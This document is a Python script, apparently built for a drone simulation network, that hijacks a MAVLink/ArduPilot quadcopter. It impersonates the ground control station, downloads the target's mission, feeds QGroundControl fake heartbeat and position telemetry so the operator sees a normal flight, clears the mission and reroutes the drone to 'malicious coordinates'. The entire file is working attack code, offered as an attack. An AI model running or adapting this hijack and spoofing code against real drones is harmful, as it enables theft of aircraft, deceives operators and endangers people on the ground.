from pymavlink import mavutil
import time
import threading
import math

# Earth radius in meters
R_EARTH = 6378137.0

def haversine(lat1, lon1, lat2, lon2):
    """Calculate distance between two lat/lon coordinates in meters."""
    lat1, lon1, lat2, lon2 = map(math.radians, [lat1, lon1, lat2, lon2])
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
    c = 2 * math.asin(math.sqrt(a))
    return R_EARTH * c

def move_towards(lat, lon, target_lat, target_lon, distance_m):
    """Move distance_m towards target, assuming small distances (simple linear interpolation)."""
    d = haversine(lat, lon, target_lat, target_lon)
    if d == 0:
        return target_lat, target_lon
    
    ratio = min(1.0, distance_m / d)
    new_lat = lat + ratio * (target_lat - lat)
    new_lon = lon + ratio * (target_lon - lon)
    return new_lat, new_lon

def virtual_drone_thread(master, target_sysid, target_compid, waypoints, current_wp_idx, start_lat, start_lon, start_alt_mm):
    """Background thread that sends spoofed telemetry to make QGC think the drone is still successfully on mission."""
    print("[Spoofer] Starting virtual drone telemetry spoofing...")
    # Create a new MAVLink encoder bound to the same master connection, but using target_sysid
    spoof_mav = mavutil.mavlink.MAVLink(master, srcSystem=target_sysid, srcComponent=target_compid)
    
    current_lat = start_lat / 1e7
    current_lon = start_lon / 1e7
    current_alt = start_alt_mm / 1000.0
    
    # Assume a cruising speed of 5 m/s based on typical arducopter defaults
    speed_m_s = 5.0
    update_rate_hz = 2.0
    dist_per_tick = speed_m_s / update_rate_hz
    
    boot_time_ms = int(time.time() * 1000) % 4294967295

    while True:
        try:
            boot_time_ms += int(1000 / update_rate_hz)
            
            # Progress simulation logic
            if current_wp_idx < len(waypoints):
                wp = waypoints[current_wp_idx]
                target_lat, target_lon, target_alt = wp['lat'], wp['lon'], wp['alt']
                
                # Some waypoints are commands with no lat/lon (e.g. 0,0)
                if target_lat == 0 and target_lon == 0:
                    print(f"[Spoofer] Skipping non-positional waypoint {current_wp_idx}")
                    spoof_mav.mission_item_reached_send(current_wp_idx)
                    current_wp_idx += 1
                    spoof_mav.mission_current_send(current_wp_idx)
                else:
                    dist = haversine(current_lat, current_lon, target_lat, target_lon)
                    
                    if dist < 2.0: # Arrived at waypoint
                        print(f"[Spoofer] Virtual Drone reached waypoint {current_wp_idx}")
                        spoof_mav.mission_item_reached_send(current_wp_idx)
                        current_wp_idx += 1
                        if current_wp_idx < len(waypoints):
                            spoof_mav.mission_current_send(current_wp_idx)
                    else:
                        current_lat, current_lon = move_towards(current_lat, current_lon, target_lat, target_lon, dist_per_tick)
            
            # 1. Send fake HEARTBEAT
            spoof_mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED | mavutil.mavlink.MAV_MODE_FLAG_AUTO_ENABLED,
                0,
                mavutil.mavlink.MAV_STATE_ACTIVE
            )
            
            # 2. Send fake GLOBAL_POSITION_INT
            spoof_mav.global_position_int_send(
                boot_time_ms,
                int(current_lat * 1e7),
                int(current_lon * 1e7),
                int(current_alt * 1000),
                int(current_alt * 1000), # use same for relative alt
                0, 0, 0, 0 # vx, vy, vz, hdg are 0 for simplicity, visual impact is minimal
            )
            
            time.sleep(1.0 / update_rate_hz)
        except Exception as e:
            print(f"[Spoofer] Error in spoofing thread: {e}")
            break

def run_byzantine_attack():
    print("--- Byzantine Node Active: Hijacking with QGC Telemetry Spoofing ---")
    # Connect to the shared simulation network
    master = mavutil.mavlink_connection('udpin:0.0.0.0:14550')
    
    target_sysid = None
    target_compid = None
    my_sysid = None

    # Step 1: Discover standard telemetry
    print("[Attack] Waiting for heartbeats to identify target...")
    while target_sysid is None:
        msg = master.recv_match(type='HEARTBEAT', blocking=True)
        src = msg.get_srcSystem()
        comp = msg.get_srcComponent()
        
        if src == 255: continue # Ignore the real GCS (QGroundControl)
        
        if my_sysid is None:
            my_sysid = src
            print(f"[Self] Our interceptor drone is System {my_sysid}")
        elif src != my_sysid:
            target_sysid = src
            target_compid = comp
            print(f"[Target] Found legitimate Target Drone at System {target_sysid}")

    # Set our System ID to QGroundControl (255) to issue commands
    master.mav.srcSystem = 255 

    # Step 2: Download Mission from Target
    print(f"[Attack] Downloading mission from System {target_sysid}...")
    master.mav.mission_request_list_send(target_sysid, target_compid)
    
    # Wait for the drone to tell us how many waypoints it has
    msg = master.recv_match(type='MISSION_COUNT', blocking=True, timeout=5)
    mission_count = msg.count if msg else 0
    print(f"[Attack] Target Drone reports {mission_count} waypoints.")
    
    waypoints = []
    for i in range(mission_count):
        master.mav.mission_request_int_send(target_sysid, target_compid, i)
        msg = master.recv_match(type='MISSION_ITEM_INT', blocking=True, timeout=5)
        if msg:
            waypoints.append({
                'seq': msg.seq,
                'lat': msg.x / 1e7,
                'lon': msg.y / 1e7,
                'alt': msg.z,
                'command': msg.command
            })
            if msg.x != 0 and msg.y != 0:
                print(f"  Downloaded WP {i}: Lat {msg.x/1e7}, Lon {msg.y/1e7}")
            else:
                print(f"  Downloaded WP {i}: Non-positional command ({msg.command})")
        else:
            print(f"  Failed to retrieve WP {i}")

    # Step 3: Extract current position and active waypoint
    print("[Attack] Locating target's current position and active routing...")
    
    start_lat, start_lon, start_alt = None, None, None
    current_wp_idx = None
    
    while start_lat is None or current_wp_idx is None:
        msg = master.recv_match(type=['GLOBAL_POSITION_INT', 'MISSION_CURRENT'], blocking=True)
        if msg is None: continue
        
        # Ensure the message is from our target
        if msg.get_srcSystem() == target_sysid:
            msg_type = msg.get_type()
            if msg_type == 'GLOBAL_POSITION_INT':
                start_lat = msg.lat
                start_lon = msg.lon
                start_alt = msg.alt
            elif msg_type == 'MISSION_CURRENT':
                current_wp_idx = msg.seq

    print(f"[Attack] Current real pos: ({start_lat/1e7}, {start_lon/1e7}). Routing to WP {current_wp_idx}")

    # Step 4: Branch execution (Spoofing vs Real Hijack)
    print("--- Initiating GCS Blindness (Spoofing) ---")
    t = threading.Thread(
        target=virtual_drone_thread, 
        args=(master, target_sysid, target_compid, waypoints, current_wp_idx, start_lat, start_lon, start_alt), 
        daemon=True
    )
    t.start()
    
    # Give the thread a tiny head start to stabilize QGC's link
    time.sleep(1)

    # Step 5: Real Hijack (GCS Impersonation)
    print(f"--- Hijacking System {target_sysid} ---")
    
    # Interrupt mission with GUIDED mode (Mode 4 in ArduPilot)
    print(f"[Hijack] Changing flight mode to GUIDED...")
    master.mav.command_long_send(
        target_sysid, target_compid,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        4, 0, 0, 0, 0, 0
    )
    
    print(f"[Hijack] Clearing target mission memory...")
    master.mav.mission_clear_all_send(target_sysid, target_compid)
    time.sleep(1)

    # Inject Malicious Destination
    malicious_lat = -35.362758
    malicious_lon = 149.165135
    malicious_alt = 20.0

    print(f"[Hijack] Re-routing to malicious coordinates ({malicious_lat}, {malicious_lon})...")
    master.mav.command_long_send(
        target_sysid, target_compid,
        mavutil.mavlink.MAV_CMD_DO_REPOSITION, 
        0, -1, 0, 0, 0,
        malicious_lat, malicious_lon, malicious_alt
    )
    
    print(f"CRITICAL: Hijack payload delivered. Spoofing is running in background.")
    
    # Keep main alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[Attack] Terminating.")

if __name__ == "__main__":
    run_byzantine_attack()